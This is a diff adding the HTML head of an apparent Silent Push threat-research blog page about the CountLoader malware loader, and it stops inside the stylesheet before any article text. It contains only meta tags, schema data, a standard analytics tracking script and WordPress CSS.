@@ -1,0 +1,2344 @@
+<!DOCTYPE html>
+<html lang="en-US" class="responsive av-preloader-disabled  html_header_top html_logo_left html_main_nav_header html_menu_right html_slim html_header_sticky html_header_shrinking html_mobile_menu_phone html_header_searchicon html_content_align_center html_header_unstick_top_disabled html_header_stretch_disabled html_av-overlay-side html_av-overlay-side-classic html_av-submenu-noclone html_entry_id_13877 av-no-preview av-default-lightbox html_text_menu_active av-mobile-menu-switch-default">
+<head>
+<meta charset="UTF-8" />
+<!-- mobile setting -->
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<!-- Scripts/CSS and wp_head hook -->
+<meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />
+
+	<!-- This site is optimized with the Yoast SEO Premium plugin v28.4 (Yoast SEO v28.5) - https://yoast.com/product/yoast-seo-premium-wordpress/ -->
+	<title>CountLoader: Silent Push Discovers New Malware Loader Being Served in 3 Different Versions - Silent Push</title>
+	<meta name="description" content="Silent Push discovered a new malware loader, we&#039;re naming “CountLoader.” The threat is served in .NET, PowerShell, and JScript versions." />
+	<link rel="canonical" href="https://www.silentpush.com/blog/countloader/" />
+	<meta property="og:locale" content="en_US" />
+	<meta property="og:type" content="article" />
+	<meta property="og:title" content="CountLoader: Silent Push Discovers New Malware Loader Being Served in 3 Different Versions" />
+	<meta property="og:description" content="Silent Push discovered a new malware loader, we&#039;re naming “CountLoader.” The threat is served in .NET, PowerShell, and JScript versions." />
+	<meta property="og:url" content="https://www.silentpush.com/blog/countloader/" />
+	<meta property="og:site_name" content="Silent Push" />
+	<meta property="article:published_time" content="2025-09-18T09:59:42+00:00" />
+	<meta property="article:modified_time" content="2025-09-18T19:12:52+00:00" />
+	<meta property="og:image" content="https://www.silentpush.com/wp-content/uploads/countloader-main-image.png" />
+	<meta property="og:image:width" content="1024" />
+	<meta property="og:image:height" content="576" />
+	<meta property="og:image:type" content="image/png" />
+	<meta name="author" content="Peggy Kelly" />
+	<meta name="twitter:card" content="summary_large_image" />
+	<meta name="twitter:creator" content="@silentpush" />
+	<meta name="twitter:site" content="@silentpush" />
+	<meta name="twitter:label1" content="Written by" />
+	<meta name="twitter:data1" content="Peggy Kelly" />
+	<meta name="twitter:label2" content="Est. reading time" />
+	<meta name="twitter:data2" content="27 minutes" />
+	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https:\/\/schema.org","@graph":[{"@type":"Article","@id":"https:\/\/www.silentpush.com\/blog\/countloader\/#article","isPartOf":{"@id":"https:\/\/www.silentpush.com\/blog\/countloader\/"},"author":{"name":"Peggy Kelly","@id":"https:\/\/www.silentpush.com\/#\/schema\/person\/42ed48a50e4c724f3aaebc334f1b5413"},"headline":"CountLoader: Silent Push Discovers New Malware Loader Being Served in 3 Different Versions","datePublished":"2025-09-18T09:59:42+00:00","dateModified":"2025-09-18T19:12:52+00:00","mainEntityOfPage":{"@id":"https:\/\/www.silentpush.com\/blog\/countloader\/"},"wordCount":5315,"publisher":{"@id":"https:\/\/www.silentpush.com\/#organization"},"image":{"@id":"https:\/\/www.silentpush.com\/blog\/countloader\/#primaryimage"},"thumbnailUrl":"https:\/\/www.silentpush.com\/wp-content\/uploads\/countloader-main-image.png","keywords":["threat"],"articleSection":["Blog"],"inLanguage":"en-US","accessibilityFeature":["tableOfContents"]},{"@type":"WebPage","@id":"https:\/\/www.silentpush.com\/blog\/countloader\/","url":"https:\/\/www.silentpush.com\/blog\/countloader\/","name":"CountLoader: Silent Push Discovers New Malware Loader Being Served in 3 Different Versions - Silent Push","isPartOf":{"@id":"https:\/\/www.silentpush.com\/#website"},"primaryImageOfPage":{"@id":"https:\/\/www.silentpush.com\/blog\/countloader\/#primaryimage"},"image":{"@id":"https:\/\/www.silentpush.com\/blog\/countloader\/#primaryimage"},"thumbnailUrl":"https:\/\/www.silentpush.com\/wp-content\/uploads\/countloader-main-image.png","datePublished":"2025-09-18T09:59:42+00:00","dateModified":"2025-09-18T19:12:52+00:00","description":"Silent Push discovered a new malware loader, we're naming “CountLoader.” The threat is served in .NET, PowerShell, and JScript versions.","breadcrumb":{"@id":"https:\/\/www.silentpush.com\/blog\/countloader\/#breadcrumb"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https:\/\/www.silentpush.com\/blog\/countloader\/"]}]},{"@type":"ImageObject","inLanguage":"en-US","@id":"https:\/\/www.silentpush.com\/blog\/countloader\/#primaryimage","url":"https:\/\/www.silentpush.com\/wp-content\/uploads\/countloader-main-image.png","contentUrl":"https:\/\/www.silentpush.com\/wp-content\/uploads\/countloader-main-image.png","width":1024,"height":576},{"@type":"BreadcrumbList","@id":"https:\/\/www.silentpush.com\/blog\/countloader\/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https:\/\/www.silentpush.com\/home\/"},{"@type":"ListItem","position":2,"name":"CountLoader: Silent Push Discovers New Malware Loader Being Served in 3 Different Versions"}]},{"@type":"WebSite","@id":"https:\/\/www.silentpush.com\/#website","url":"https:\/\/www.silentpush.com\/","name":"Silent Push","description":"Neutralize Before Compromise","publisher":{"@id":"https:\/\/www.silentpush.com\/#organization"},"potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https:\/\/www.silentpush.com\/?s={search_term_string}"},"query-input":{"@type":"PropertyValueSpecification","valueRequired":true,"valueName":"search_term_string"}}],"inLanguage":"en-US"},{"@type":"Organization","@id":"https:\/\/www.silentpush.com\/#organization","name":"Silent Push","url":"https:\/\/www.silentpush.com\/","logo":{"@type":"ImageObject","inLanguage":"en-US","@id":"https:\/\/www.silentpush.com\/#\/schema\/logo\/image\/","url":"https:\/\/www.silentpush.com\/wp-content\/uploads\/Punch-Featured-Image-696x696-2.jpg","contentUrl":"https:\/\/www.silentpush.com\/wp-content\/uploads\/Punch-Featured-Image-696x696-2.jpg","width":696,"height":696,"caption":"Silent Push"},"image":{"@id":"https:\/\/www.silentpush.com\/#\/schema\/logo\/image\/"},"sameAs":["https:\/\/x.com\/silentpush","https:\/\/www.linkedin.com\/company\/silent-push\/","https:\/\/bsky.app\/profile\/silentpush.bsky.social"]},{"@type":"Person","@id":"https:\/\/www.silentpush.com\/#\/schema\/person\/42ed48a50e4c724f3aaebc334f1b5413","name":"Peggy Kelly","image":{"@type":"ImageObject","inLanguage":"en-US","@id":"https:\/\/secure.gravatar.com\/avatar\/0261bffaa6f8fcf6ab266fd8bcf58a5e7c5ce0d80c7892a30ec76986f69692a3?s=96&d=mm&r=g","url":"https:\/\/secure.gravatar.com\/avatar\/0261bffaa6f8fcf6ab266fd8bcf58a5e7c5ce0d80c7892a30ec76986f69692a3?s=96&d=mm&r=g","contentUrl":"https:\/\/secure.gravatar.com\/avatar\/0261bffaa6f8fcf6ab266fd8bcf58a5e7c5ce0d80c7892a30ec76986f69692a3?s=96&d=mm&r=g","caption":"Peggy Kelly"}}]}</script>
+	<!-- / Yoast SEO Premium plugin. -->
+
+
+<link rel='dns-prefetch' href='//js.hs-scripts.com' />
+<link rel='dns-prefetch' href='//fonts.googleapis.com' />
+<link rel="alternate" type="application/rss+xml" title="Silent Push &raquo; Feed" href="https://www.silentpush.com/feed/" />
+<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://www.silentpush.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.silentpush.com%2Fblog%2Fcountloader%2F" />
+<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://www.silentpush.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.silentpush.com%2Fblog%2Fcountloader%2F&#038;format=xml" />
+		<!-- This site uses the Google Analytics by MonsterInsights plugin v11.3.0 - Using Analytics tracking - https://www.monsterinsights.com/ -->
+							<script src="//www.googletagmanager.com/gtag/js?id=G-Y982JNG573"  data-cfasync="false" data-wpfc-render="false" type="text/javascript" async></script>
+			<script data-cfasync="false" data-wpfc-render="false" type="text/javascript">
+				var mi_version = '11.3.0';
+				var mi_track_user = true;
+				var mi_no_track_reason = '';
+								var MonsterInsightsDefaultLocations = {"page_location":"https:\/\/www.silentpush.com\/blog\/countloader\/"};
+								MonsterInsightsDefaultLocations.page_location = window.location.href;
+								if ( typeof MonsterInsightsPrivacyGuardFilter === 'function' ) {
+					var MonsterInsightsLocations = (typeof MonsterInsightsExcludeQuery === 'object') ? MonsterInsightsPrivacyGuardFilter( MonsterInsightsExcludeQuery ) : MonsterInsightsPrivacyGuardFilter( MonsterInsightsDefaultLocations );
+				} else {
+					var MonsterInsightsLocations = (typeof MonsterInsightsExcludeQuery === 'object') ? MonsterInsightsExcludeQuery : MonsterInsightsDefaultLocations;
+				}
+
+								var disableStrs = [
+										'ga-disable-G-Y982JNG573',
+									];
+
+				/* Function to detect opted out users */
+				function __gtagTrackerIsOptedOut() {
+					for (var index = 0; index < disableStrs.length; index++) {
+						if (document.cookie.indexOf(disableStrs[index] + '=true') > -1) {
+							return true;
+						}
+					}
+
+					return false;
+				}
+
+				/* Disable tracking if the opt-out cookie exists. */
+				if (__gtagTrackerIsOptedOut()) {
+					for (var index = 0; index < disableStrs.length; index++) {
+						window[disableStrs[index]] = true;
+					}
+				}
+
+				/* Opt-out function */
+				function __gtagTrackerOptout() {
+					for (var index = 0; index < disableStrs.length; index++) {
+						document.cookie = disableStrs[index] + '=true; expires=Thu, 31 Dec 2099 23:59:59 UTC; path=/';
+						window[disableStrs[index]] = true;
+					}
+				}
+
+				if ('undefined' === typeof gaOptout) {
+					function gaOptout() {
+						__gtagTrackerOptout();
+					}
+				}
+								window.dataLayer = window.dataLayer || [];
+
+				window.MonsterInsightsDualTracker = {
+					helpers: {},
+					trackers: {},
+				};
+				if (mi_track_user) {
+					function __gtagDataLayer() {
+						dataLayer.push(arguments);
+					}
+
+					function __gtagTracker(type, name, parameters) {
+						if (!parameters) {
+							parameters = {};
+						}
+
+						if (parameters.send_to) {
+							__gtagDataLayer.apply(null, arguments);
+							return;
+						}
+
+						if (type === 'event') {
+														parameters.send_to = monsterinsights_frontend.v4_id;
+							var hookName = name;
+							if (typeof parameters['event_category'] !== 'undefined') {
+								hookName = parameters['event_category'] + ':' + name;
+							}
+
+							if (typeof MonsterInsightsDualTracker.trackers[hookName] !== 'undefined') {
+								MonsterInsightsDualTracker.trackers[hookName](parameters);
+							} else {
+								__gtagDataLayer('event', name, parameters);
+							}
+							
+						} else {
+							__gtagDataLayer.apply(null, arguments);
+						}
+					}
+
+					__gtagTracker('js', new Date());
+					__gtagTracker('set', {
+						'developer_id.dZGIzZG': true,
+											});
+					if ( MonsterInsightsLocations.page_location ) {
+						__gtagTracker('set', MonsterInsightsLocations);
+					}
+										__gtagTracker('config', 'G-Y982JNG573', {"forceSSL":"true","link_attribution":"true"} );
+										window.gtag = __gtagTracker;										(function () {
+						/* https://developers.google.com/analytics/devguides/collection/analyticsjs/ */
+						/* ga and __gaTracker compatibility shim. */
+						var noopfn = function () {
+							return null;
+						};
+						var newtracker = function () {
+							return new Tracker();
+						};
+						var Tracker = function () {
+							return null;
+						};
+						var p = Tracker.prototype;
+						p.get = noopfn;
+						p.set = noopfn;
+						p.send = function () {
+							var args = Array.prototype.slice.call(arguments);
+							args.unshift('send');
+							__gaTracker.apply(null, args);
+						};
+						var __gaTracker = function () {
+							var len = arguments.length;
+							if (len === 0) {
+								return;
+							}
+							var f = arguments[len - 1];
+							if (typeof f !== 'object' || f === null || typeof f.hitCallback !== 'function') {
+								if ('send' === arguments[0]) {
+									var hitConverted, hitObject = false, action;
+									if ('event' === arguments[1]) {
+										if ('undefined' !== typeof arguments[3]) {
+											hitObject = {
+												'eventAction': arguments[3],
+												'eventCategory': arguments[2],
+												'eventLabel': arguments[4],
+												'value': arguments[5] ? arguments[5] : 1,
+											}
+										}
+									}
+									if ('pageview' === arguments[1]) {
+										if ('undefined' !== typeof arguments[2]) {
+											hitObject = {
+												'eventAction': 'page_view',
+												'page_path': arguments[2],
+											}
+										}
+									}
+									if (typeof arguments[2] === 'object') {
+										hitObject = arguments[2];
+									}
+									if (typeof arguments[5] === 'object') {
+										Object.assign(hitObject, arguments[5]);
+									}
+									if ('undefined' !== typeof arguments[1].hitType) {
+										hitObject = arguments[1];
+										if ('pageview' === hitObject.hitType) {
+											hitObject.eventAction = 'page_view';
+										}
+									}
+									if (hitObject) {
+										action = 'timing' === arguments[1].hitType ? 'timing_complete' : hitObject.eventAction;
+										hitConverted = mapArgs(hitObject);
+										__gtagTracker('event', action, hitConverted);
+									}
+								}
+								return;
+							}
+
+							function mapArgs(args) {
+								var arg, hit = {};
+								var gaMap = {
+									'eventCategory': 'event_category',
+									'eventAction': 'event_action',
+									'eventLabel': 'event_label',
+									'eventValue': 'event_value',
+									'nonInteraction': 'non_interaction',
+									'timingCategory': 'event_category',
+									'timingVar': 'name',
+									'timingValue': 'value',
+									'timingLabel': 'event_label',
+									'page': 'page_path',
+									'location': 'page_location',
+									'title': 'page_title',
+									'referrer' : 'page_referrer',
+								};
+								for (arg in args) {
+																		if (!(!args.hasOwnProperty(arg) || !gaMap.hasOwnProperty(arg))) {
+										hit[gaMap[arg]] = args[arg];
+									} else {
+										hit[arg] = args[arg];
+									}
+								}
+								return hit;
+							}
+
+							try {
+								f.hitCallback();
+							} catch (ex) {
+							}
+						};
+						__gaTracker.create = newtracker;
+						__gaTracker.getByName = newtracker;
+						__gaTracker.getAll = function () {
+							return [];
+						};
+						__gaTracker.remove = noopfn;
+						__gaTracker.loaded = true;
+						window['__gaTracker'] = __gaTracker;
+					})();
+									} else {
+										console.log("");
+					(function () {
+						function __gtagTracker() {
+							return null;
+						}
+
+						window['__gtagTracker'] = __gtagTracker;
+						window['gtag'] = __gtagTracker;
+					})();
+									}
+			</script>
+							<!-- / Google Analytics by MonsterInsights -->
+				<style id="content-control-block-styles">
+			@media (max-width: 640px) {
+	.cc-hide-on-mobile {
+		display: none !important;
+	}
+}
+@media (min-width: 641px) and (max-width: 920px) {
+	.cc-hide-on-tablet {
+		display: none !important;
+	}
+}
+@media (min-width: 921px) and (max-width: 1440px) {
+	.cc-hide-on-desktop {
+		display: none !important;
+	}
+}		</style>
+		<style id="wp-img-auto-sizes-contain-inline-css">
+img:is([sizes=auto i],[sizes^="auto," i]){contain-intrinsic-size:3000px 1500px}
+/*# sourceURL=wp-img-auto-sizes-contain-inline-css */
+</style>
+<style id="wp-emoji-styles-inline-css">
+
+	img.wp-smiley, img.emoji {
+		display: inline !important;
+		border: none !important;
+		box-shadow: none !important;
+		height: 1em !important;
+		width: 1em !important;
+		margin: 0 0.07em !important;
+		vertical-align: -0.1em !important;
+		background: none !important;
+		padding: 0 !important;
+	}
+/*# sourceURL=wp-emoji-styles-inline-css */
+</style>
+<style id="wp-block-library-inline-css">
+:root{--wp-block-synced-color:#7a00df;--wp-block-synced-color--rgb:122,0,223;--wp-bound-block-color:var(--wp-block-synced-color);--wp-editor-canvas-background:#ddd;--wp-admin-theme-color:#007cba;--wp-admin-theme-color--rgb:0,124,186;--wp-admin-theme-color-darker-10:#006ba1;--wp-admin-theme-color-darker-10--rgb:0,107,160.5;--wp-admin-theme-color-darker-20:#005a87;--wp-admin-theme-color-darker-20--rgb:0,90,135;--wp-admin-border-width-focus:2px}@media (min-resolution:192dpi){:root{--wp-admin-border-width-focus:1.5px}}.wp-element-button{cursor:pointer}:root .has-very-light-gray-background-color{background-color:#eee}:root .has-very-dark-gray-background-color{background-color:#313131}:root .has-very-light-gray-color{color:#eee}:root .has-very-dark-gray-color{color:#313131}:root .has-vivid-green-cyan-to-vivid-cyan-blue-gradient-background{background:linear-gradient(135deg,#00d084,#0693e3)}:root .has-purple-crush-gradient-background{background:linear-gradient(135deg,#34e2e4,#4721fb 50%,#ab1dfe)}:root .has-hazy-dawn-gradient-background{background:linear-gradient(135deg,#faaca8,#dad0ec)}:root .has-subdued-olive-gradient-background{background:linear-gradient(135deg,#fafae1,#67a671)}:root .has-atomic-cream-gradient-background{background:linear-gradient(135deg,#fdd79a,#004a59)}:root .has-nightshade-gradient-background{background:linear-gradient(135deg,#330968,#31cdcf)}:root .has-midnight-gradient-background{background:linear-gradient(135deg,#020381,#2874fc)}:root{--wp--preset--font-size--normal:16px;--wp--preset--font-size--huge:42px}.has-regular-font-size{font-size:1em}.has-larger-font-size{font-size:2.625em}.has-normal-font-size{font-size:var(--wp--preset--font-size--normal)}.has-huge-font-size{font-size:var(--wp--preset--font-size--huge)}:root .has-text-align-center{text-align:center}:root .has-text-align-left{text-align:left}:root .has-text-align-right{text-align:right}.has-fit-text{white-space:nowrap!important}#end-resizable-editor-section{display:none}.aligncenter{clear:both}.items-justified-left{justify-content:flex-start}.items-justified-center{justify-content:center}.items-justified-right{justify-content:flex-end}.items-justified-space-between{justify-content:space-between}.screen-reader-text{word-wrap:normal!important;border:0;clip-path:inset(50%);height:1px;margin:-1px;overflow:hidden;padding:0;position:absolute;width:1px}.screen-reader-text:focus{background-color:#ddd;clip-path:none;color:#444;display:block;font-size:1em;height:auto;left:5px;line-height:normal;padding:15px 23px 14px;text-decoration:none;top:5px;width:auto;z-index:100000}html :where(.has-border-color){border-style:solid}html :where([style*=border-color]){border-style:solid}html :where([style*=border-top-color]){border-top-style:solid}html :where([style*=border-right-color]){border-right-style:solid}html :where([style*=border-bottom-color]){border-bottom-style:solid}html :where([style*=border-left-color]){border-left-style:solid}html :where([style*=border-width]){border-style:solid}html :where([style*=border-top-width]){border-top-style:solid}html :where([style*=border-right-width]){border-right-style:solid}html :where([style*=border-bottom-width]){border-bottom-style:solid}html :where([style*=border-left-width]){border-left-style:solid}html :where(img[class*=wp-image-]){height:auto;max-width:100%}:where(figure){margin:0 0 1em}html :where(.is-position-sticky){--wp-admin--admin-bar--position-offset:var(--wp-admin--admin-bar--height,0px)}@media screen and (max-width:600px){html :where(.is-position-sticky){--wp-admin--admin-bar--position-offset:0px}}
+
+/*# sourceURL=/wp-includes/css/dist/block-library/common.min.css */
+</style>
+<style id="wp-block-button-inline-css">
+.wp-block-button__link{align-content:center;box-sizing:border-box;cursor:pointer;display:inline-block;height:100%;text-align:center;word-break:break-word}.wp-block-button__link.aligncenter{text-align:center}.wp-block-button__link.alignright{text-align:right}:where(.wp-block-button__link){border-radius:9999px;box-shadow:none;padding:calc(.667em + 2px) calc(1.333em + 2px);text-decoration:none}.wp-block-button[style*=text-decoration] .wp-block-button__link{text-decoration:inherit}.wp-block-buttons>.wp-block-button.has-custom-width{max-width:none}.wp-block-buttons>.wp-block-button.has-custom-width .wp-block-button__link{width:100%}.wp-block-buttons>.wp-block-button.has-custom-font-size .wp-block-button__link{font-size:inherit}.wp-block-buttons>.wp-block-button.wp-block-button__width-25{width:calc(25% - var(--wp--style--block-gap, .5em)*.75)}.wp-block-buttons>.wp-block-button.wp-block-button__width-50{width:calc(50% - var(--wp--style--block-gap, .5em)*.5)}.wp-block-buttons>.wp-block-button.wp-block-button__width-75{width:calc(75% - var(--wp--style--block-gap, .5em)*.25)}.wp-block-buttons>.wp-block-button.wp-block-button__width-100{flex-basis:100%;width:100%}.wp-block-buttons.is-vertical>.wp-block-button.wp-block-button__width-25{width:25%}.wp-block-buttons.is-vertical>.wp-block-button.wp-block-button__width-50{width:50%}.wp-block-buttons.is-vertical>.wp-block-button.wp-block-button__width-75{width:75%}.wp-block-button.is-style-squared,.wp-block-button__link.wp-block-button.is-style-squared{border-radius:0}.wp-block-button.no-border-radius,.wp-block-button__link.no-border-radius{border-radius:0!important}:root :where(.wp-block-button .wp-block-button__link.is-style-outline),:root :where(.wp-block-button.is-style-outline>.wp-block-button__link){border:2px solid;padding:.667em 1.333em}:root :where(.wp-block-button .wp-block-button__link.is-style-outline:not(.has-text-color)),:root :where(.wp-block-button.is-style-outline>.wp-block-button__link:not(.has-text-color)){color:currentColor}:root :where(.wp-block-button .wp-block-button__link.is-style-outline:not(.has-background)),:root :where(.wp-block-button.is-style-outline>.wp-block-button__link:not(.has-background)){background-color:initial;background-image:none}
+/*# sourceURL=https://www.silentpush.com/wp-includes/blocks/button/style.min.css */
+</style>
+<style id="wp-block-heading-inline-css">
+h1:where(.wp-block-heading).has-background,h2:where(.wp-block-heading).has-background,h3:where(.wp-block-heading).has-background,h4:where(.wp-block-heading).has-background,h5:where(.wp-block-heading).has-background,h6:where(.wp-block-heading).has-background{padding:1.25em 2.375em}h1.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h1.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]),h2.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h2.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]),h3.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h3.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]),h4.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h4.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]),h5.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h5.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]),h6.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h6.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]){rotate:180deg}
+/*# sourceURL=https://www.silentpush.com/wp-includes/blocks/heading/style.min.css */
+</style>
+<style id="wp-block-image-inline-css">
+.wp-block-image>a,.wp-block-image>figure>a{display:inline-block}.wp-block-image img{box-sizing:border-box;height:auto;max-width:100%;vertical-align:bottom}@media not (prefers-reduced-motion){.wp-block-image img.hide{visibility:hidden}.wp-block-image img.show{animation:show-content-image .4s}}.wp-block-image[style*=border-radius] img,.wp-block-image[style*=border-radius]>a{border-radius:inherit}.wp-block-image.has-custom-border img{box-sizing:border-box}.wp-block-image.aligncenter{text-align:center}.wp-block-image.alignfull>a,.wp-block-image.alignwide>a{width:100%}.wp-block-image.alignfull img,.wp-block-image.alignwide img{height:auto;width:100%}.wp-block-image .aligncenter,.wp-block-image .alignleft,.wp-block-image .alignright,.wp-block-image.aligncenter,.wp-block-image.alignleft,.wp-block-image.alignright{display:table}.wp-block-image .aligncenter>figcaption,.wp-block-image .alignleft>figcaption,.wp-block-image .alignright>figcaption,.wp-block-image.aligncenter>figcaption,.wp-block-image.alignleft>figcaption,.wp-block-image.alignright>figcaption{caption-side:bottom;display:table-caption}.wp-block-image .alignleft{float:left;margin:.5em 1em .5em 0}.wp-block-image .alignright{float:right;margin:.5em 0 .5em 1em}.wp-block-image .aligncenter{margin-left:auto;margin-right:auto}.wp-block-image :where(figcaption){margin-bottom:1em;margin-top:.5em}.wp-block-image.is-style-circle-mask img{border-radius:9999px}@supports ((-webkit-mask-image:none) or (mask-image:none)) or (-webkit-mask-image:none){.wp-block-image.is-style-circle-mask img{border-radius:0;-webkit-mask-image:url('data:image/svg+xml;utf8,<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg"><circle cx="50" cy="50" r="50"/></svg>');mask-image:url('data:image/svg+xml;utf8,<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg"><circle cx="50" cy="50" r="50"/></svg>');mask-mode:alpha;-webkit-mask-position:center;mask-position:center;-webkit-mask-repeat:no-repeat;mask-repeat:no-repeat;-webkit-mask-size:contain;mask-size:contain}}:root :where(.wp-block-image.is-style-rounded img,.wp-block-image .is-style-rounded img){border-radius:9999px}.wp-block-image figure{margin:0}.wp-lightbox-container{display:flex;flex-direction:column;position:relative}.wp-lightbox-container img{cursor:zoom-in}.wp-lightbox-container img:hover+button{opacity:1}.wp-lightbox-container button{align-items:center;backdrop-filter:blur(16px) saturate(180%);background-color:#5a5a5a40;border:none;border-radius:4px;cursor:zoom-in;display:flex;height:20px;justify-content:center;opacity:0;padding:0;position:absolute;right:16px;text-align:center;top:16px;width:20px;z-index:100}@media not (prefers-reduced-motion){.wp-lightbox-container button{transition:opacity .2s ease}}.wp-lightbox-container button:focus-visible{outline:3px auto #5a5a5a40;outline:3px auto -webkit-focus-ring-color;outline-offset:3px}.wp-lightbox-container button:hover{cursor:pointer;opacity:1}.wp-lightbox-container button:focus{opacity:1}.wp-lightbox-container button:focus,.wp-lightbox-container button:hover,.wp-lightbox-container button:not(:hover):not(:active):not(.has-background){background-color:#5a5a5a40;border:none}.wp-lightbox-overlay{box-sizing:border-box;cursor:zoom-out;height:100vh;left:0;overflow:hidden;position:fixed;top:0;visibility:hidden;width:100%;z-index:100000}.wp-lightbox-overlay .wp-lightbox-close-button{align-items:center;cursor:pointer;display:flex;font-family:inherit;gap:8px;justify-content:center;line-height:1;min-height:40px;min-width:40px;padding:0 4px;position:absolute;right:calc(env(safe-area-inset-right) + 16px);top:calc(env(safe-area-inset-top) + 16px);z-index:5000000}.wp-lightbox-overlay .wp-lightbox-close-button:focus,.wp-lightbox-overlay .wp-lightbox-close-button:hover,.wp-lightbox-overlay .wp-lightbox-close-button:not(:hover):not(:active):not(.has-background){background:none;border:none}.wp-lightbox-overlay .wp-lightbox-close-button:has(.wp-lightbox-close-text:not([hidden])) .wp-lightbox-close-icon svg{height:1em;width:1em}.wp-lightbox-overlay .wp-lightbox-close-icon svg{display:block}.wp-lightbox-overlay .wp-lightbox-navigation-button-next,.wp-lightbox-overlay .wp-lightbox-navigation-button-prev{align-items:center;bottom:16px;cursor:pointer;display:flex;font-family:inherit;gap:4px;justify-content:center;line-height:1;min-height:40px;min-width:40px;padding:0 8px;position:absolute;z-index:2000002}.wp-lightbox-overlay .wp-lightbox-navigation-button-next[hidden],.wp-lightbox-overlay .wp-lightbox-navigation-button-prev[hidden]{display:none}@media (min-width:960px){.wp-lightbox-overlay .wp-lightbox-navigation-button-next,.wp-lightbox-overlay .wp-lightbox-navigation-button-prev{bottom:50%;transform:translateY(-50%)}}.wp-lightbox-overlay .wp-lightbox-navigation-button-next:focus,.wp-lightbox-overlay .wp-lightbox-navigation-button-next:hover,.wp-lightbox-overlay .wp-lightbox-navigation-button-next:not(:hover):not(:active):not(.has-background),.wp-lightbox-overlay .wp-lightbox-navigation-button-prev:focus,.wp-lightbox-overlay .wp-lightbox-navigation-button-prev:hover,.wp-lightbox-overlay .wp-lightbox-navigation-button-prev:not(:hover):not(:active):not(.has-background){background:none;border:none;padding:0 8px}.wp-lightbox-overlay .wp-lightbox-navigation-button-next:has(.wp-lightbox-navigation-text:not([hidden])) .wp-lightbox-navigation-icon svg,.wp-lightbox-overlay .wp-lightbox-navigation-button-prev:has(.wp-lightbox-navigation-text:not([hidden])) .wp-lightbox-navigation-icon svg{display:block;height:1.5em;width:1.5em}.wp-lightbox-overlay .wp-lightbox-navigation-button-prev{left:calc(env(safe-area-inset-left) + 16px)}.wp-lightbox-overlay .wp-lightbox-navigation-button-next{right:calc(env(safe-area-inset-right) + 16px)}.wp-lightbox-overlay .wp-lightbox-navigation-icon svg{vertical-align:middle}.wp-lightbox-overlay .lightbox-image-container{height:var(--wp--lightbox-container-height);left:50%;overflow:hidden;position:absolute;top:50%;transform:translate(-50%,-50%);transform-origin:top left;width:var(--wp--lightbox-container-width);z-index:2000001}.wp-lightbox-overlay .wp-block-image{align-items:center;box-sizing:border-box;display:flex;height:100%;justify-content:center;margin:0;position:relative;transform-origin:0 0;width:100%;z-index:3000000}.wp-lightbox-overlay .wp-block-image img{height:var(--wp--lightbox-image-height);min-height:var(--wp--lightbox-image-height);min-width:var(--wp--lightbox-image-width);width:var(--wp--lightbox-image-width)}.wp-lightbox-overlay .wp-block-image figcaption{display:none}.wp-lightbox-overlay button{background:none;border:none}.wp-lightbox-overlay .scrim{background-color:#fff;height:100%;opacity:.9;position:absolute;width:100%;z-index:2000000}.wp-lightbox-overlay.active{visibility:visible}@media not (prefers-reduced-motion){.wp-lightbox-overlay.active{animation:turn-on-visibility .25s both}.wp-lightbox-overlay.active img{animation:turn-on-visibility .35s both}.wp-lightbox-overlay.show-closing-animation:not(.active){animation:turn-off-visibility .35s both}.wp-lightbox-overlay.show-closing-animation:not(.active) img{animation:turn-off-visibility .25s both}.wp-lightbox-overlay.zoom.active{animation:none;opacity:1;visibility:visible}.wp-lightbox-overlay.zoom.active .lightbox-image-container{animation:lightbox-zoom-in .4s}.wp-lightbox-overlay.zoom.active .lightbox-image-container img{animation:none}.wp-lightbox-overlay.zoom.active .scrim{animation:turn-on-visibility .4s forwards}.wp-lightbox-overlay.zoom.show-closing-animation:not(.active){animation:none}.wp-lightbox-overlay.zoom.show-closing-animation:not(.active) .lightbox-image-container{animation:lightbox-zoom-out .4s}.wp-lightbox-overlay.zoom.show-closing-animation:not(.active) .lightbox-image-container img{animation:none}.wp-lightbox-overlay.zoom.show-closing-animation:not(.active) .scrim{animation:turn-off-visibility .4s forwards}}@keyframes show-content-image{0%{visibility:hidden}99%{visibility:hidden}to{visibility:visible}}@keyframes turn-on-visibility{0%{opacity:0}to{opacity:1}}@keyframes turn-off-visibility{0%{opacity:1;visibility:visible}99%{opacity:0;visibility:visible}to{opacity:0;visibility:hidden}}@keyframes lightbox-zoom-in{0%{transform:translate(calc((-100vw + var(--wp--lightbox-scrollbar-width))/2 + var(--wp--lightbox-initial-left-position)),calc(-50vh + var(--wp--lightbox-initial-top-position))) scale(var(--wp--lightbox-scale))}to{transform:translate(-50%,-50%) scale(1)}}@keyframes lightbox-zoom-out{0%{transform:translate(-50%,-50%) scale(1);visibility:visible}99%{visibility:visible}to{transform:translate(calc((-100vw + var(--wp--lightbox-scrollbar-width))/2 + var(--wp--lightbox-initial-left-position)),calc(-50vh + var(--wp--lightbox-initial-top-position))) scale(var(--wp--lightbox-scale));visibility:hidden}}
+/*# sourceURL=https://www.silentpush.com/wp-includes/blocks/image/style.min.css */
+</style>
+<style id="wp-block-list-inline-css">
